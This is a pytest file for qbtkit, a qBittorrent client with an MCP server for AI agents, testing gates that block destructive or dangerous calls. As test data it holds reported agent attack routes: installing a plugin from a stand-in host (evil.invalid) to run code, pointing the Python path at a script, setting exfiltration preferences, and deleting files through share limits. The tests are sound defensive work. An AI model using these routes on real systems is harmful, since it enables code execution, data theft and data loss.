"""Safety gates. These protect the user from the tool, so they get their own file.

The review of the first plan found that gating only the curated MCP tools left
the raw escape hatch reaching every destructive endpoint ungated. The gates
therefore live in the client, which both the CLI and MCP go through.
"""

from __future__ import annotations

import pytest

from qbtkit import errors
from qbtkit.client import Client, encode
from qbtkit.spec import load_all
from qbtkit.spec._types import Wire
from qbtkit.spec.app import LOCKOUT_KEYS


def _client(*, read_only: bool = False) -> Client:
    # Port 1 is unreachable on purpose: every gate below must fire before any
    # request is attempted, so these stay fast and offline.
    return Client("http://127.0.0.1:1", username="u", password="p", read_only=read_only)


def test_destructive_requires_confirm() -> None:
    c = _client()
    with pytest.raises(errors.ConfirmationRequired):
        c.call("torrents/delete", hashes="all", deleteFiles=True)


def test_read_only_refuses_mutations() -> None:
    c = _client(read_only=True)
    with pytest.raises(errors.ReadOnly):
        c.call("torrents/stop", hashes="all")


def test_read_only_allows_reads() -> None:
    """A read in read-only mode must fail on transport, not on the gate."""
    c = _client(read_only=True)
    with pytest.raises(errors.QbtError) as excinfo:
        c.call("torrents/info")
    assert not isinstance(excinfo.value, errors.ReadOnly)


@pytest.mark.parametrize("key", sorted(LOCKOUT_KEYS))
def test_setpreferences_refuses_lockout_keys(key: str) -> None:
    """Writing any of these severs the connection or weakens security.

    A model asked to 'change the download limit' must not be able to set
    `web_ui_password` in the same call.
    """
    c = _client()
    with pytest.raises(errors.BlockedParameter) as excinfo:
        c.call("app/setPreferences", json={key: "x", "dl_limit": 1024})
    assert key in str(excinfo.value)


def test_setpreferences_allows_ordinary_keys() -> None:
    c = _client()
    with pytest.raises(errors.QbtError) as excinfo:
        c.call("app/setPreferences", json={"dl_limit": 1024, "max_active_downloads": 5})
    assert not isinstance(excinfo.value, errors.BlockedParameter)


def test_shutdown_is_destructive_and_untestable() -> None:
    ep = next(e for e in load_all() if e.path == "app/shutdown")
    assert ep.destructive and ep.mutating
    assert ep.untestable, "shutdown must declare why it is not contract-tested"


def test_api_key_endpoints_are_destructive() -> None:
    """Rotating or deleting the key locks out anyone authenticating with it."""
    for path in ("app/rotateAPIKey", "app/deleteAPIKey"):
        ep = next(e for e in load_all() if e.path == path)
        assert ep.destructive, f"{path} should require confirmation"


def test_endpoints_named_path_do_not_collide_with_call() -> None:
    """Several endpoints take a parameter called `path`.

    `Client.call(path, ...)` names its own first argument the same thing, so
    without positional-only parameters `call("rss/addFolder", path="x")` raises
    TypeError for multiple values. Guard against the signature regressing.
    """
    import inspect

    sig = inspect.signature(Client.call)
    kind = sig.parameters["path"].kind
    assert kind is inspect.Parameter.POSITIONAL_ONLY, (
        "Client.call's `path` must be positional-only so endpoints may use "
        "`path` as a parameter name"
    )
    colliding = [e.path for e in load_all() if any(p.name == "path" for p in e.params)]
    assert colliding, "expected some endpoints to take a `path` parameter"
    c = _client()
    for path in colliding:
        with pytest.raises(errors.QbtError):  # transport, not TypeError
            c.call(path, path="irrelevant")


@pytest.mark.parametrize("falsey", ["false", "False", "FALSE", "0", "no", "off"])
def test_string_false_does_not_become_true(falsey: str) -> None:
    """`deleteFiles=false` from the CLI must not delete the files.

    Every `-p key=value` on `qbt call` arrives as a string, and an agent using
    `qbt_call` can pass one too. Under plain truthiness every non-empty string
    is true, so the one spelling a user reaches for to *protect* their data —
    `deleteFiles=false` — encoded as `true` and wiped it. Booleans crossing a
    text boundary have to be parsed, not evaluated.
    """
    assert encode(Wire.BOOL_STR, falsey) == "false"


@pytest.mark.parametrize("truthy", ["true", "True", "1", "yes", "on"])
def test_string_true_is_still_true(truthy: str) -> None:
    assert encode(Wire.BOOL_STR, truthy) == "true"


def test_real_booleans_are_unaffected() -> None:
    assert encode(Wire.BOOL_STR, True) == "true"
    assert encode(Wire.BOOL_STR, False) == "false"


def test_an_ambiguous_boolean_is_refused_rather_than_guessed() -> None:
    """Guessing here is how `deleteFiles=maybe` silently becomes destructive."""
    with pytest.raises(errors.QbtError, match="boolean"):
        encode(Wire.BOOL_STR, "perhaps")


def test_blocklist_sees_through_a_json_string() -> None:
    """A blocked key hidden in a JSON *string* must still be refused.

    The CLI hands `--json '{...}'` straight through as text, and the gate only
    inspected `dict` values, so the check quietly matched nothing. The request
    then went out double-encoded and qBittorrent ignored it, which hid the hole
    behind a silent no-op: the command appeared to work, changed nothing, and
    reported success. The gate has to understand the wire form the CLI actually
    sends.
    """
    c = Client("http://127.0.0.1:1", username="u", password="p", api_key=None)
    try:
        with pytest.raises(errors.BlockedParameter, match="web_ui_port"):
            c.call("app/setPreferences", json='{"web_ui_port": 9999}')
    finally:
        c.close()


def test_a_blocklisted_param_rejects_a_value_it_cannot_inspect() -> None:
    """If the gate cannot see inside a value, it must refuse, not wave it past."""
    c = Client("http://127.0.0.1:1", username="u", password="p", api_key=None)
    try:
        with pytest.raises(errors.QbtError):
            c.call("app/setPreferences", json="not json at all")
    finally:
        c.close()


def test_a_plain_json_string_still_reaches_the_wire() -> None:
    """Parsing must not break the legitimate case: a safe dict as a string."""
    from qbtkit.client import encode
    from qbtkit.spec._types import Wire

    assert encode(Wire.JSON_BLOB, '{"dl_limit": 22222}') == '{"dl_limit": 22222}'
    assert encode(Wire.JSON_BLOB, {"dl_limit": 22222}) == '{"dl_limit": 22222}'


def test_keychain_can_be_switched_off(monkeypatch: pytest.MonkeyPatch) -> None:
    """A caller that passes explicit credentials must not get ambient ones too.

    The contract tests construct a client with `api_key=None` and a container's
    throwaway username, on the understanding that the author's real credentials
    stay out of the test session. They did not: `None` fell through to the
    Keychain, so a real API key was sent as a Bearer token to every disposable
    container the suite started. Sending a live credential somewhere it was
    never meant to go is worth an explicit off switch.
    """
    import qbtkit.client as mod

    monkeypatch.setattr(mod, "_keychain", lambda *a, **k: "KEYCHAIN-SECRET")
    monkeypatch.delenv("QBT_API_KEY", raising=False)
    monkeypatch.delenv("QBT_PASSWORD", raising=False)

    leaky = Client("http://127.0.0.1:1", username="u", password="p", api_key=None)
    try:
        assert leaky._api_key == "KEYCHAIN-SECRET", "default should still use the Keychain"
    finally:
        leaky.close()

    sealed = Client(
        "http://127.0.0.1:1", username="u", password="p", api_key=None, use_keychain=False
    )
    try:
        assert sealed._api_key is None
        assert sealed._password == "p"
    finally:
        sealed.close()


# --------------------------------------------------------------------------- #
# Agent gates.
#
# Two external reports against 0.1.2 found that the gates above, which are built
# for "the model might ask for anything the API allows", missed several routes to
# the outcomes they exist to prevent. Each test below replays a call the reporter
# actually made against qBittorrent 5.1.4 and 5.2.3.
#
# These run offline on purpose, like the rest of the file: every gate must fire
# before a request is attempted, so a refusal never depends on the server being
# reachable.


def _agent(*, read_only: bool = False) -> Client:
    return Client(
        "http://127.0.0.1:1",
        username="u",
        password="p",
        read_only=read_only,
        agent=True,
        use_keychain=False,
    )


def test_agent_flag_is_off_by_default() -> None:
    """The CLI must keep working exactly as it did; only MCP tightens."""
    assert _client().agent is False


def test_mcp_server_builds_an_agent_client() -> None:
    """If this regresses, every gate below silently stops applying."""
    from qbtkit.mcp import server as mcp

    c = mcp._client()
    try:
        assert c.agent is True
    finally:
        c.close()


def test_agent_cannot_install_search_plugins() -> None:
    """Reported: a plugin was fetched from a URL and its Python executed inside
    qBittorrent's process. The endpoint carried a prose warning, not a gate."""
    c = _agent()
    with pytest.raises(errors.AgentForbidden):
        c.call("search/installPlugin", sources="http://evil.invalid/plugin.py")
    with pytest.raises(errors.AgentForbidden):
        c.call("search/updatePlugins")


def test_cli_can_still_install_search_plugins() -> None:
    """The gate is about who is asking, not about the endpoint being wrong. A
    person typing `qbt search install-plugin` has made a real decision."""
    c = _client()
    with pytest.raises(errors.TransportError):  # reached the network: gates passed
        c.call("search/installPlugin", sources="http://example.invalid/p.py")


def test_python_executable_path_is_refused_on_every_path() -> None:
    """Reported: pointing this at a binary already on the host and then running a
    search executed that file. Same outcome as autorun_program, which was
    blocked; this was the route left open."""
    for c in (_agent(), _client()):
        with pytest.raises(errors.BlockedParameter):
            c.call("app/setPreferences", json={"python_executable_path": "/tmp/x.sh"})


def test_agent_cannot_write_the_share_limit_action() -> None:
    """Reported: max_ratio_act=3 with a zero seeding-time limit removed a finished
    torrent and deleted its files about 12 seconds later. It is a global setting,
    so it applies to every finished torrent, and no confirm was required."""
    c = _agent()
    with pytest.raises(errors.AgentForbidden):
        c.call(
            "app/setPreferences",
            json={
                "max_seeding_time_enabled": True,
                "max_seeding_time": 0,
                "max_ratio_act": 3,
            },
        )


def test_agent_cannot_write_exfiltration_preferences() -> None:
    """None of these were in the blocklist, and none needed to be named: they are
    absent from the allowlist by the principle that an agent may not set a host,
    a URL, or a path the server writes to."""
    c = _agent()
    for key, value in (
        ("proxy_ip", "10.0.0.1"),
        ("proxy_type", 3),
        ("export_dir", "/tmp/exfil"),
        ("scan_dirs", {"/tmp/drop": 0}),
        ("add_trackers", "http://evil.invalid/announce"),
        ("mail_notification_sender", "x@evil.invalid"),
        ("file_log_path", "/tmp/log"),
        ("announce_ip", "10.0.0.1"),
    ):
        with pytest.raises(errors.AgentForbidden):
            c.call("app/setPreferences", json={key: value})


def test_agent_can_still_write_ordinary_preferences() -> None:
    """The allowlist has to let real work through or it will be turned off. These
    reach the network, which means they passed every gate."""
    c = _agent()
    for key, value in (
        ("dl_limit", 1024),
        ("up_limit", 512),
        ("max_active_downloads", 3),
        ("queueing_enabled", True),
        ("save_path", "/downloads"),
        ("listen_port", 6881),
    ):
        with pytest.raises(errors.TransportError):  # reached the network
            c.call("app/setPreferences", json={key: value})


def test_torrent_creator_cannot_choose_its_output_path_or_seed() -> None:
    """Reported: torrentFilePath overwrote an existing file, and the directory
    holding qBittorrent's configuration became a torrent that was announced."""
    c = _agent()
    with pytest.raises(errors.AgentForbidden):
        c.call(
            "torrentcreator/addTask",
            sourcePath="/downloads/x",
            torrentFilePath="/etc/important.conf",
            confirm=True,
        )
    with pytest.raises(errors.AgentForbidden):
        c.call(
            "torrentcreator/addTask",
            sourcePath="/config",
            startSeeding=True,
            confirm=True,
        )


def test_endpoints_whose_whole_reply_is_a_secret_are_refused() -> None:
    """Redacting a field called `value` or `ssl_private_key` is both too broad
    elsewhere and too narrow here. Nothing an agent does needs these."""
    c = _agent()
    for path, params in (
        ("app/cookies", {}),
        ("torrents/SSLParameters", {"hash": "a" * 40}),
    ):
        with pytest.raises(errors.AgentForbidden):
            c.call(path, **params)


def test_no_override_refusals_come_before_the_confirm_prompt() -> None:
    """Ordered the other way, a model is told to pass confirm=True, passes it,
    and only then learns there was never an override."""
    c = _agent()
    with pytest.raises(errors.AgentForbidden):
        c.call("app/setCookies", cookies={"x": "y"}, confirm=True)


def test_share_limits_now_need_confirmation() -> None:
    """Reaching a share limit deletes data when max_ratio_act is 1 or 3, so this
    had the same outcome as torrents/delete while needing no confirm."""
    c = _client()
    with pytest.raises(errors.ConfirmationRequired):
        c.call("torrents/setShareLimits", hashes="all", ratioLimit=0, seedingTimeLimit=0)


def test_allowlist_and_blocklist_do_not_overlap() -> None:
    """A key on both would be refused by one gate and permitted by the other,
    and which won would depend on the order the loops happen to run in."""
    from qbtkit.spec.app import SAFE_PREF_KEYS

    assert not (SAFE_PREF_KEYS & LOCKOUT_KEYS)
